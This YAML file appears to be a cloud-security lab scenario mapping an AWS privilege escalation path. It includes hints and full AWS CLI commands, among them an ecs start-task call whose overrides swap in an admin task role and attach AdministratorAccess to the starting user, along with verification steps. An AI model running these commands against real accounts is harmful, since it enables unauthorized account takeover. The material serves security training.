attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-009-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the ECS admin task role and
        ecs:StartTask permission, enabling privilege escalation via task override without
        needing to register a new task definition or container instance.

    - id: ecs-task
      label: "ECS Task (Overridden)"
      type: resource
      subType: ecs-task
      arn: "arn:aws:ecs:{region}:{account_id}:task-definition/pl-prod-ecs-009-existing-task"
      description: >
        This is a pre-existing benign ECS task definition registered in the cluster.
        By using ecs:StartTask with --overrides, the attacker can substitute both the
        container command and the taskRoleArn at runtime, completely changing the task's
        behavior and permissions without creating a new task definition.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-009-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com.
        When passed via the --overrides taskRoleArn parameter, the ECS task container
        runs with this role's credentials, allowing it to perform any AWS action including
        attaching the AdministratorAccess policy to the starting user.

  edges:
    - from: starting-user
      to: ecs-task
      label: "ecs:StartTask + iam:PassRole"
      description: >
        Start the existing ECS task with --overrides specifying the admin role as
        taskRoleArn and a malicious container command. iam:PassRole is required to
        substitute the task role at runtime.
      hints:
        - "You can start ECS tasks on existing container instances."
        - "Look at what parameters ecs:StartTask accepts — specifically the --overrides flag."
        - "The --overrides parameter accepts a taskRoleArn that replaces the task definition's default role at runtime."
        - "This task definition is already registered — you do not need RegisterTaskDefinition."
        - "Override the container command to run an AWS CLI command that escalates privileges."
        - "Browse to https://pathfinding.cloud/paths/ecs-009 for technique details."
      commands:
        - description: "List available ECS clusters"
          command: "aws ecs list-clusters"
        - description: "List existing task definitions"
          command: "aws ecs list-task-definitions --family-prefix pl-prod-ecs-009"
        - description: "List registered container instances in the cluster"
          command: "aws ecs list-container-instances --cluster pl-prod-ecs-009-cluster"
        - description: "Start the existing task with overrides to inject admin role and malicious command"
          command: "aws ecs start-task --cluster pl-prod-ecs-009-cluster --task-definition pl-prod-ecs-009-existing-task --container-instances <CONTAINER_INSTANCE_ARN> --overrides '{\"taskRoleArn\": \"arn:aws:iam::{account_id}:role/pl-prod-ecs-009-to-admin-target-role\", \"containerOverrides\": [{\"name\": \"pl-prod-ecs-009-container\", \"command\": [\"aws\", \"iam\", \"attach-user-policy\", \"--user-name\", \"pl-prod-ecs-009-to-admin-starting-user\", \"--policy-arn\", \"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'"

    - from: ecs-task
      to: target-role
      label: "taskRoleArn override"
      description: >
        The ECS task runs with the overridden task role, granting the container
        AdministratorAccess credentials via the instance metadata service. The container
        executes an AWS CLI command using the admin role's credentials to attach
        AdministratorAccess to the starting user, completing the privilege escalation.
      hints:
        - "After the task starts, monitor its status — wait for it to reach STOPPED before checking results."
        - "Use ecs:DescribeTasks to poll the task's lastStatus and container exit code."
        - "IAM policy changes are not instantaneous — allow up to 15 seconds for the attached policy to take effect."
        - "Verify success by listing attached policies on the starting user with iam:ListAttachedUserPolicies."
        - "Confirm full admin access by calling a privileged IAM API such as iam:ListUsers."
      commands:
        - description: "Verify privilege escalation succeeded by checking attached policies"
          command: "aws iam list-attached-user-policies --user-name pl-prod-ecs-009-to-admin-starting-user"
        - description: "Confirm admin access with a privileged API call"
          command: "aws iam list-users"
